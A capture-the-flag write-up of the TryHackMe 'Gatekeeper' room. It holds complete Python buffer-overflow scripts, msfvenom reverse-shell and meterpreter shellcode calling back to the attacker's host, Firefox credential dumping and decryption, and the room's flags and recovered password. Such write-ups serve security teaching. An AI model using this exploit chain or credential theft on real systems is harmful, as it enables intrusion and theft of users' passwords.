---
layout: post
title: THM — Gatekeeper
date: 2022-10-04 04:00:00 -500
categories: [TryHackMe]
tags: [Buffer Overflow]
---

<img src="/assets/images/THM/Gatekeeper/logo.jpeg" width="20%">

***

<center><strong><font color="White">Can you get past the gate and through the fire?</font></strong></center>

***

## <strong><font color="#34A5DA">Reccon</font></strong>

Nmap scan for all ports:

```
vladislav@Mac ~ % nmap -p- 10.10.98.70
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-05 20:29 MSK
Nmap scan report for 10.10.98.70
Host is up (0.076s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown
49164/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2191.00 seconds
```

Next let's check for shares with the help of smbclient:

```
vladislav@Mac ~ % smbclient -L 10.10.98.70
Can't load /opt/homebrew/etc/smb.conf - run testparm to debug it
Password for [WORKGROUP\vladislav]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Users           Disk      
SMB1 disabled -- no workgroup available

vladislav@Mac ~ % smbclient //10.10.98.70/Users
smb: \> dir
  .                                  DR        0  Fri May 15 04:57:08 2020
  ..                                 DR        0  Fri May 15 04:57:08 2020
  Default                           DHR        0  Tue Jul 14 11:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 08:54:24 2009
  Share                               D        0  Fri May 15 04:58:07 2020

		7863807 blocks of size 4096. 3862328 blocks available
smb: \> cd Share
smb: \Share\> dir
  .                                   D        0  Fri May 15 04:58:07 2020
  ..                                  D        0  Fri May 15 04:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 08:27:17 2020

		7863807 blocks of size 4096. 3862584 blocks available
```

Here we can see `gatekeeper.exe` which we can download for further analysis with command `get gatekeeper.exe`. Due to the fact that this room is about buffer overflow — send the file into Immunity Debugger. First, we need to run it and try to interact with it.

<img src="/assets/images/THM/Gatekeeper/1.png" width="80%">

The program is listening for connection but we don't know the port on which it's listening. We can nmap the VM for open ports, but there is an easier way — we can see port 31337 is being used for something unknown called `Elite` on vulnerable machine. And yes — that's it.

```
netcat 10.211.55.3 31337
```

> Note: 10.211.55.3 is the IP of the VM on my PC running Windows 11.

<img src="/assets/images/THM/Gatekeeper/2.png" width="80%">

The program is probably just repeating our input.

## <strong><font color="#34A5DA">Buffer Overflow</font></strong>

First, we need to check the program for buffer overflow vulnerability. I will be using `fuzzer.py` from *Brainstorm*:

```python
#!/usr/bin/env python3

import socket, sys

ip = "10.211.55.3"
port = 31337
payload_length = 3000
payload = b'A' * payload_length

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

<img src="/assets/images/THM/Gatekeeper/3.png" width="80%">

The program crashed after sending to it 3002 bytes and we can see that the **EIP** is `41414141` which is `AAAA`. So, we proved the buffer overflow vulnerability.

Next we need to get to know how many bytes are needed to crash the app.

```python
#!/usr/bin/env python3

import socket, sys, time

ip = "10.211.55.3"
port = 31337
timeout = 5

# Creating buffers with different amounts of A's
buffer = []
counter = 100
while len(buffer) < 20:
  buffer.append(b"A" * counter)
  counter += 100

# Fuzzing
for string in buffer:
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, port))
    print("Fuzzing with %s bytes" % len(string))
    s.send(string + b"\r\n")
    s.recv(1024)
    s.close()
  except:
    print("Could not connect to " + ip + ":" + str(port))
    sys.exit(0)
  time.sleep(1)
```

```
vladislav@Mac Desktop % python3 fuzzer.py
Fuzzing with 100 bytes
Fuzzing with 200 bytes
Could not connect to 10.211.55.3:31337
```

Now we know that the amount of bytes somewhere between 200 and 300. To get to know exactly how many bytes we need we can use a custom string with unique bytes and which bytes will be in EIP register — that are the end bytes.

Using metasploit framework we can create a unique string:

```
┌──(simpuar㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./pattern_create.rb -l 300            
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

```python
#!/usr/bin/env python3

import socket, sys

ip = "10.211.55.3"
port = 31337
payload_length = 300
payload = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

<img src="/assets/images/THM/Gatekeeper/4.png" width="80%">

The value of EIP is `39654138`

Using metasploit framework we can calculate the offset:

```
┌──(simpuar㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ msf-pattern_offset -l 300 -q 39654138
[*] Exact match at offset 146
```

Now we now the offset: `146`. I will skip the step with checking if we can overwrite ESP with our custom bytes using this offset. 

The next step is to find if there are any badchars.

``` python
#!/usr/bin/env python3

import socket, sys

ip = "10.211.55.3"
port = 31337
payload_length = 300
offset = 146
payload = b'A' * offset + b'B' * 4
badchars = ( b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + badchars + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

Create a badarray of bad chars and compare it with hex dump using mona:
```
!mona config -set workingfolder Z:\Desktop\
!mona bytearray -b "\x00"
!mona compare -f Z:\Desktop\bytearray.bin -a 07741954
```

<img src="/assets/images/THM/Gatekeeper/5.png" width="80%">

So there are two bad chars: `\x00` and `\x0a`.

Now we can find the bytecode for `JMP ESP` using mona.

<img src="/assets/images/THM/Gatekeeper/6.png" width="80%">

We have two addresses. Let's use the second one. `0x080416bf` will become `\xbf\x16\x04\x08`.

Now we can generate a reverse shell payload using msfvenom:

``` console
vladislav@Mac Desktop % msfvenom -p windows/shell_reverse_tcp LHOST=10.18.7.222 LPORT=4444 -b "\x00\x0a" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1506 bytes
unsigned char buf[] = 
"\xda\xc1\xbe\xae\x2f\x76\x11\xd9\x74\x24\xf4\x5d\x29\xc9"
"\xb1\x52\x83\xed\xfc\x31\x75\x13\x03\xdb\x3c\x94\xe4\xdf"
"\xab\xda\x07\x1f\x2c\xbb\x8e\xfa\x1d\xfb\xf5\x8f\x0e\xcb"
"\x7e\xdd\xa2\xa0\xd3\xf5\x31\xc4\xfb\xfa\xf2\x63\xda\x35"
"\x02\xdf\x1e\x54\x80\x22\x73\xb6\xb9\xec\x86\xb7\xfe\x11"
"\x6a\xe5\x57\x5d\xd9\x19\xd3\x2b\xe2\x92\xaf\xba\x62\x47"
"\x67\xbc\x43\xd6\xf3\xe7\x43\xd9\xd0\x93\xcd\xc1\x35\x99"
"\x84\x7a\x8d\x55\x17\xaa\xdf\x96\xb4\x93\xef\x64\xc4\xd4"
"\xc8\x96\xb3\x2c\x2b\x2a\xc4\xeb\x51\xf0\x41\xef\xf2\x73"
"\xf1\xcb\x03\x57\x64\x98\x08\x1c\xe2\xc6\x0c\xa3\x27\x7d"
"\x28\x28\xc6\x51\xb8\x6a\xed\x75\xe0\x29\x8c\x2c\x4c\x9f"
"\xb1\x2e\x2f\x40\x14\x25\xc2\x95\x25\x64\x8b\x5a\x04\x96"
"\x4b\xf5\x1f\xe5\x79\x5a\xb4\x61\x32\x13\x12\x76\x35\x0e"
"\xe2\xe8\xc8\xb1\x13\x21\x0f\xe5\x43\x59\xa6\x86\x0f\x99"
"\x47\x53\x9f\xc9\xe7\x0c\x60\xb9\x47\xfd\x08\xd3\x47\x22"
"\x28\xdc\x8d\x4b\xc3\x27\x46\x7e\x06\x20\x48\x16\x24\x2e"
"\x65\xbb\xa1\xc8\xef\x53\xe4\x43\x98\xca\xad\x1f\x39\x12"
"\x78\x5a\x79\x98\x8f\x9b\x34\x69\xe5\x8f\xa1\x99\xb0\xed"
"\x64\xa5\x6e\x99\xeb\x34\xf5\x59\x65\x25\xa2\x0e\x22\x9b"
"\xbb\xda\xde\x82\x15\xf8\x22\x52\x5d\xb8\xf8\xa7\x60\x41"
"\x8c\x9c\x46\x51\x48\x1c\xc3\x05\x04\x4b\x9d\xf3\xe2\x25"
"\x6f\xad\xbc\x9a\x39\x39\x38\xd1\xf9\x3f\x45\x3c\x8c\xdf"
"\xf4\xe9\xc9\xe0\x39\x7e\xde\x99\x27\x1e\x21\x70\xec\x2e"
"\x68\xd8\x45\xa7\x35\x89\xd7\xaa\xc5\x64\x1b\xd3\x45\x8c"
"\xe4\x20\x55\xe5\xe1\x6d\xd1\x16\x98\xfe\xb4\x18\x0f\xfe"
"\x9c";
```

Updating our python script:
```python
#!/usr/bin/env python3

import socket, sys

ip = "10.10.7.45"
port = 31337
payload_length = 300
offset = 146
payload = b'A' * offset + b'\xBF\x16\x04\x08' + b'\x90' * 10

payload += b"\xda\xc1\xbe\xae\x2f\x76\x11\xd9\x74\x24\xf4\x5d\x29\xc9"
payload += b"\xb1\x52\x83\xed\xfc\x31\x75\x13\x03\xdb\x3c\x94\xe4\xdf"
payload += b"\xab\xda\x07\x1f\x2c\xbb\x8e\xfa\x1d\xfb\xf5\x8f\x0e\xcb"
payload += b"\x7e\xdd\xa2\xa0\xd3\xf5\x31\xc4\xfb\xfa\xf2\x63\xda\x35"
payload += b"\x02\xdf\x1e\x54\x80\x22\x73\xb6\xb9\xec\x86\xb7\xfe\x11"
payload += b"\x6a\xe5\x57\x5d\xd9\x19\xd3\x2b\xe2\x92\xaf\xba\x62\x47"
payload += b"\x67\xbc\x43\xd6\xf3\xe7\x43\xd9\xd0\x93\xcd\xc1\x35\x99"
payload += b"\x84\x7a\x8d\x55\x17\xaa\xdf\x96\xb4\x93\xef\x64\xc4\xd4"
payload += b"\xc8\x96\xb3\x2c\x2b\x2a\xc4\xeb\x51\xf0\x41\xef\xf2\x73"
payload += b"\xf1\xcb\x03\x57\x64\x98\x08\x1c\xe2\xc6\x0c\xa3\x27\x7d"
payload += b"\x28\x28\xc6\x51\xb8\x6a\xed\x75\xe0\x29\x8c\x2c\x4c\x9f"
payload += b"\xb1\x2e\x2f\x40\x14\x25\xc2\x95\x25\x64\x8b\x5a\x04\x96"
payload += b"\x4b\xf5\x1f\xe5\x79\x5a\xb4\x61\x32\x13\x12\x76\x35\x0e"
payload += b"\xe2\xe8\xc8\xb1\x13\x21\x0f\xe5\x43\x59\xa6\x86\x0f\x99"
payload += b"\x47\x53\x9f\xc9\xe7\x0c\x60\xb9\x47\xfd\x08\xd3\x47\x22"
payload += b"\x28\xdc\x8d\x4b\xc3\x27\x46\x7e\x06\x20\x48\x16\x24\x2e"
payload += b"\x65\xbb\xa1\xc8\xef\x53\xe4\x43\x98\xca\xad\x1f\x39\x12"
payload += b"\x78\x5a\x79\x98\x8f\x9b\x34\x69\xe5\x8f\xa1\x99\xb0\xed"
payload += b"\x64\xa5\x6e\x99\xeb\x34\xf5\x59\x65\x25\xa2\x0e\x22\x9b"
payload += b"\xbb\xda\xde\x82\x15\xf8\x22\x52\x5d\xb8\xf8\xa7\x60\x41"
payload += b"\x8c\x9c\x46\x51\x48\x1c\xc3\x05\x04\x4b\x9d\xf3\xe2\x25"
payload += b"\x6f\xad\xbc\x9a\x39\x39\x38\xd1\xf9\x3f\x45\x3c\x8c\xdf"
payload += b"\xf4\xe9\xc9\xe0\x39\x7e\xde\x99\x27\x1e\x21\x70\xec\x2e"
payload += b"\x68\xd8\x45\xa7\x35\x89\xd7\xaa\xc5\x64\x1b\xd3\x45\x8c"
payload += b"\xe4\x20\x55\xe5\xe1\x6d\xd1\x16\x98\xfe\xb4\x18\x0f\xfe"
payload += b"\x9c"

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  print("Connected")
except Exception as e:
  print("Error while connecting")
  print(e)
  sys.exit(1)

try:
  print("Sending payload")
  s.send(payload + b'\r\n')
  s.recv(1024)
except Exception as e:
  print("Error while sending data")
  print(e)
  sys.exit(1)

finally:
  print("Closing socket")
  s.close()
```

> Note: IP 10.10.7.45 is VM on THM

Listening with netcat:
```
vladislav@Mac ~ % netcat -nlvp 4444
Connection from 10.10.7.45:49162
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>
```

On Desktop we can find user flag:
```
C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}
```

> Locate and find the User Flag. `{H4lf_W4y_Th3r3}`

***

## <strong><font color="#34A5DA">Privilege Escalation — Firefox Creds</font></strong>

While searching for files on user's desktop we can find Firefox.lnk — which is a shortcut for Firefox. 

```
C:\Users\natbat\Desktop>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  09:24 PM    <DIR>          .
05/14/2020  09:24 PM    <DIR>          ..
04/21/2020  05:00 PM             1,197 Firefox.lnk
04/20/2020  01:27 AM            13,312 gatekeeper.exe
04/21/2020  09:53 PM               135 gatekeeperstart.bat
05/14/2020  09:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,845,920,768 bytes free
```

Searching on metasploit for `Firefox` we can find `post/multi/gather/firefox_creds` — to . Let's use it. Let's try to dump the creds and crack them. However, first we need to create a session in metasploit.

Recreate the payload:
```
vladislav@Mac Desktop % msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.18.7.222 LPORT=4444 -b "\x00\x0a" -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of c file: 1632 bytes
unsigned char buf[] = 
"\xb8\xba\x6e\xd7\xa7\xda\xda\xd9\x74\x24\xf4\x5b\x29\xc9"
"\xb1\x59\x31\x43\x14\x03\x43\x14\x83\xc3\x04\x58\x9b\x2b"
"\x4f\x13\x64\xd4\x90\x4b\xec\x31\xa1\x59\x8a\x32\x90\x6d"
"\xd8\x17\x19\x06\x8c\x83\x2e\xaf\x7b\x8a\xbb\xbd\x53\xe3"
"\x44\x70\x64\xaf\x87\x13\x18\xb2\xdb\xf3\x21\x7d\x2e\xf2"
"\x66\xcb\x44\x1b\x3a\x9b\x2d\xb1\xab\xa8\x70\x09\xcd\x7e"
"\xff\x31\xb5\xfb\xc0\xc5\x09\x05\x11\xae\xda\x1d\xc1\x3b"
"\x82\x3d\xe0\xe8\xb6\xf7\x96\x32\x88\xf8\x1e\xc1\xde\x8d"
"\xa0\x03\x2f\x52\x63\x64\x5d\xfe\x65\xbd\x66\x1e\x10\xb5"
"\x94\xa3\x23\x0e\xe6\x7f\xa1\x90\x40\x0b\x11\x74\x70\xd8"
"\xc4\xff\x7e\x95\x83\xa7\x62\x28\x47\xdc\x9f\xa1\x66\x32"
"\x16\xf1\x4c\x96\x72\xa1\xed\x8f\xde\x04\x11\xcf\x87\xf9"
"\xb7\x84\x2a\xef\xc8\x65\xb5\x10\x95\xf1\x79\xdd\x26\x01"
"\x16\x56\x54\x33\xb9\xcc\xf2\x7f\x32\xcb\x05\xf6\x54\xec"
"\xda\xb0\x35\x12\xdb\xc0\x1c\xd1\x8f\x90\x36\xf0\xaf\x7b"
"\xc7\xfd\x65\x11\xcd\x69\x8c\xf7\xd6\xb7\xf8\xf5\xd8\x56"
"\xa5\x70\x3e\x08\x05\xd2\xef\xe9\xf5\x92\x5f\x82\x1f\x1d"
"\xbf\xb2\x1f\xf4\xa8\x59\xf0\xa0\x81\xf5\x69\xe9\x5a\x67"
"\x75\x24\x27\xa7\xfd\xcc\xd7\x66\xf6\xa5\xcb\x9f\x61\x45"
"\x14\x60\x04\x45\x7e\x64\x8e\x12\x16\x66\xf7\x54\xb9\x99"
"\xd2\xe7\xbe\x66\xa3\xd1\xb5\x51\x31\x5d\xa2\x9d\xd5\x5d"
"\x32\xc8\xbf\x5d\x5a\xac\x9b\x0e\x7f\xb3\x31\x23\x2c\x26"
"\xba\x15\x80\xe1\xd2\x9b\xff\xc6\x7c\x64\x2a\x55\x7a\x9a"
"\xa8\x72\x23\xf2\x52\xc3\xd3\x02\x39\xc3\x83\x6a\xb6\xec"
"\x2c\x5a\x37\x27\x65\xf2\xb2\xa6\xc7\x63\xc2\xe2\x86\x3d"
"\xc3\x01\x13\xce\xbe\x6a\xa4\x2f\x3f\x63\xc1\x30\x3f\x8b"
"\xf7\x0d\xe9\xb2\x8d\x50\x29\x81\x9e\xe7\x0c\xa0\x34\x07"
"\x02\xb2\x1c";
```

Change the payload in python script and start listener with metasplout `multi/handler` with payload `windows/meterpreter/reverse_tcp`.

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.7.222:4444 
[*] Sending stage (175686 bytes) to 10.10.206.76
[*] Meterpreter session 5 opened (10.18.7.222:4444 -> 10.10.206.76:49189) at 2022-10-05 22:58:07 +0300

meterpreter > 
```

```
msf6 exploit(multi/handler) > use post/multi/gather/firefox_creds
msf6 post(multi/gather/firefox_creds) > set session 5
msf6 post(multi/gather/firefox_creds) > run

[-] Error loading USER S-1-5-21-663372427-3699997616-3390412905-1000: Hive could not be loaded, are you Admin?
[*] Checking for Firefox profile in: C:\Users\natbat\AppData\Roaming\Mozilla\

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
[+] Downloaded cert9.db: /Users/vladislav/.msf4/loot/20221005230017_default_10.10.206.76_ff.ljfn812a.cert_577876.bin
[+] Downloaded cookies.sqlite: /Users/vladislav/.msf4/loot/20221005230018_default_10.10.206.76_ff.ljfn812a.cook_715879.bin
[+] Downloaded key4.db: /Users/vladislav/.msf4/loot/20221005230019_default_10.10.206.76_ff.ljfn812a.key4_878520.bin
[+] Downloaded logins.json: /Users/vladislav/.msf4/loot/20221005230020_default_10.10.206.76_ff.ljfn812a.logi_258189.bin

[*] Profile: C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\rajfzh3y.default

[*] Post module execution completed
```

Copy downloaded files to some folder and clone the following directory: `https://github.com/unode/firefox_decrypt`.

Renaming the files:
```
vladislav@Mac GimmeTheLoot % mv 20221005230017_default_10.10.206.76_ff.ljfn812a.cert_577876.bin cert9.db
vladislav@Mac GimmeTheLoot % mv 20221005230018_default_10.10.206.76_ff.ljfn812a.cook_715879.bin cookies.sqlite
vladislav@Mac GimmeTheLoot % mv 20221005230019_default_10.10.206.76_ff.ljfn812a.key4_878520.bin key4.db
vladislav@Mac GimmeTheLoot % mv 20221005230020_default_10.10.206.76_ff.ljfn812a.logi_258189.bin logins.json
```

Installing `nss` library:
```bash
brew install nss
```

Running the script:
```
vladislav@Mac GimmeTheLoot % python3 firefox_decrypt/firefox_decrypt.py .
2022-10-05 23:09:54,403 - WARNING - profile.ini not found in .
2022-10-05 23:09:54,404 - WARNING - Continuing and assuming '.' is a profile location

Website:   https://creds.com
Username: 'mayor'
Password: '8CL7O1N78MdrCIsV'
vladislav@Mac GimmeTheLoot % 
```

Now we can use rdp to connect to our vulnerable machine. I used Microsoft Remote Desktop app.

<img src="/assets/images/THM/Gatekeeper/7.png" width="80%">

And finally on desktop we see `root.txt` which we can open.

> Locate and find the Root Flag `{Th3_M4y0r_C0ngr4tul4t3s_U}`